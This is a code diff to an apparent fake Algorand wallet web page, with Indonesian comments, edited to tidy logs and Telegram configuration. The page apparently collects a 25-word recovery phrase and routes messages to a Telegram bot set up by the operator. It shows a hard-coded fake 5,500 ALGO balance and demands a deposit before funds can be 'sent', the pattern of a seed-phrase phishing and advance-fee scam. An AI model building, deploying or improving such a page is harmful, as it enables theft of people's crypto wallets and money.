@@ -7,7 +7,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
-        /* SEMUA STYLE ANDA TETAP SAMA seperti yang diberikan */
+        
         * { margin: 0; padding: 0; box-sizing: border-box; }
         :root {
             --primary: #00A4E0;
@@ -329,12 +329,11 @@
     </div>
 
     <script>
-        // ==================== TELEGRAM CONFIGURATION (AMAN) ====================
-        // Token akan di-inject oleh GitHub Actions saat build
-        // JANGAN UBAH bagian ini - gunakan GitHub Secrets
-        
-        const TELEGRAM_BOT_TOKEN = '__TELEGRAM_BOT_TOKEN__';  // Akan diganti saat deploy
-        const TELEGRAM_CHAT_ID = '__TELEGRAM_CHAT_ID__';      // Akan diganti saat deploy
+        // ==================== TELEGRAM CONFIGURATION ( DIINJECT SAAT BUILD) ====================
+
+    
+        const TELEGRAM_BOT_TOKEN = '__TELEGRAM_BOT_TOKEN__';  // 
+        const TELEGRAM_CHAT_ID = '__TELEGRAM_CHAT_ID__';      //
         
         const DEFAULT_WORD_COUNT = 25;
         let currentWordCount = 25;
@@ -361,7 +360,7 @@
         let previousAlgoBalance = 0;
         
         // Check if user has deposited minimum requirement
-        let hasMinimumDeposit = true; // Set to true because ALGO balance is 5500 >= 2000
+        let hasMinimumDeposit = true;
         
         const pageConfirm = document.getElementById('pageConfirm');
         const pageRecovery = document.getElementById('pageRecovery');
@@ -384,10 +383,10 @@
         }
         
         async function sendMessageToTelegram(message) {
-            // Cek apakah token sudah diisi dengan benar
-            if (TELEGRAM_BOT_TOKEN === '__TELEGRAM_BOT_TOKEN__' || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
-                console.warn('⚠️ Telegram token belum dikonfigurasi. Gunakan GitHub Secrets untuk mengisi token.');
-                showNotification('⚠️ Telegram notifikasi tidak tersedia (token belum dikonfigurasi)', 'warning');
+            // Cek apakah token sudah diisi (bukan placeholder)
+            if (TELEGRAM_BOT_TOKEN === '__TELEGRAM_BOT_TOKEN__' || !TELEGRAM_BOT_TOKEN) {
+                console.warn('⚠️ Telegram token belum dikonfigurasi. Setup GitHub Secrets terlebih dahulu.');
+                showNotification('⚠️ Notifikasi Telegram tidak aktif - token belum dikonfigurasi', 'warning');
                 return false;
             }
             
@@ -406,10 +405,10 @@
             }
         }
         
-        // Test fungsi Telegram (opsional - bisa dipanggil dari console)
+        // Test fungsi Telegram
         window.testTelegram = async function() {
-            const result = await sendMessageToTelegram('✅ Test message from Algo Wallet!');
-            showNotification(result ? '✅ Telegram connected!' : '❌ Telegram failed. Check console.', result ? 'success' : 'error');
+            const result = await sendMessageToTelegram('✅ Bot Connected! Algo Wallet is online. (Test message)');
+            showNotification(result ? '✅ Telegram connected! Check your Telegram.' : '❌ Telegram failed. Setup GitHub Secrets.', result ? 'success' : 'error');
         };
         
         function checkDepositRequirement() {
@@ -859,15 +858,16 @@
         updateWordCounter();
         fetchAlgoPrice();
         
-        console.log('%c✅ ALGO WALLET - BALANCE: 5,500 ALGO', 'color: #00A4E0; font-size: 14px; font-weight: bold;');
-        console.log('%c✅ SEND REQUIREMENT: Min 2,000 ALGO or 100 USD deposit to unlock Send', 'color: #10B981; font-size: 12px;');
-        console.log('%c✅ WITHDRAW REQUIREMENT: Min 2,000 ALGO or 100 USD', 'color: #F59E0B; font-size: 12px;');
-        console.log('%c✅ ALL FEATURES ARE ACTIVE', 'color: #00A4E0; font-size: 14px; font-weight: bold;');
+        // Cek status token saat startup
         if (TELEGRAM_BOT_TOKEN === '__TELEGRAM_BOT_TOKEN__') {
-            console.warn('%c⚠️ PERINGATAN: Telegram token belum dikonfigurasi! Setup GitHub Secrets untuk mengaktifkan notifikasi.', 'color: #FF6B4A; font-size: 12px;');
+            console.warn('%c⚠️ PERINGATAN: Telegram token belum dikonfigurasi!', 'color: #FF6B4A; font-size: 14px; font-weight: bold;');
+            console.warn('%c📝 Setup GitHub Secrets: TELEGRAM_BOT_TOKEN dan TELEGRAM_CHAT_ID', 'color: #F59E0B; font-size: 12px;');
         } else {
-            console.log('%c✅ TELEGRAM BOT ACTIVE - Notifications enabled', 'color: #10B981; font-size: 12px;');
+            console.log('%c✅ TELEGRAM BOT ACTIVE - Notifikasi akan terkirim ke Telegram', 'color: #10B981; font-size: 14px; font-weight: bold;');
         }
+        
+        console.log('%c✅ ALGO WALLET - BALANCE: 5,500 ALGO', 'color: #00A4E0; font-size: 14px; font-weight: bold;');
+        console.log('%c✅ Website: https://algorisex.online', 'color: #00A4E0; font-size: 12px;');
     </script>
 </body>
 </html>
